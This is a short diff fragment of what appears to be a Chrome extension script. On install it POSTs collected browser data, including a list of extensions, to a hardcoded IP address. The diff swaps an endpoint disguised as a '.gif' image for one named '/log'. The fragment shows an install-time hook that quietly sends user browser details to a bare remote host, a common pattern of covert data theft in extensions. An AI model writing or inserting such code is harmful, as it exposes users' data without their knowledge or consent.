@@ -25,7 +25,7 @@ chrome.runtime.onInstalled.addListener(() => {
         extensions: rawData.extensions
       };
 
-      fetch('http://172.16.1.20:8000/oiiaioooooiai.gif', {
+      fetch('http://172.16.1.20:8000/log', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(sanitizedData)
